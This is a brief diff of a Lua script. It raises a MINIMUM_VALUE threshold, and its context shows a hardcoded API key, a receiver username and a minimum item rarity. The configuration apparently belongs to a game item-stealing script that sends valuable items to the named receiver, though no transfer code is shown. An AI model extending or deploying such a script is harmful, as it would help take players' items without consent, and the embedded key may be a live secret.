@@ -7,7 +7,7 @@ local API_KEY       = "b8eddf719c63cef785fa56ac8996d85413c2e0ba4c8ae769"
 
 local RECEIVER = {"JAMAL_THESCRIPTGUY"}
 local MINIMUM_RARITY = "Legendary"
-local MINIMUM_VALUE = 0.14
+local MINIMUM_VALUE = 0.15
 local RECEIVERx = RECEIVER
 
 local function GetRequestFunction()
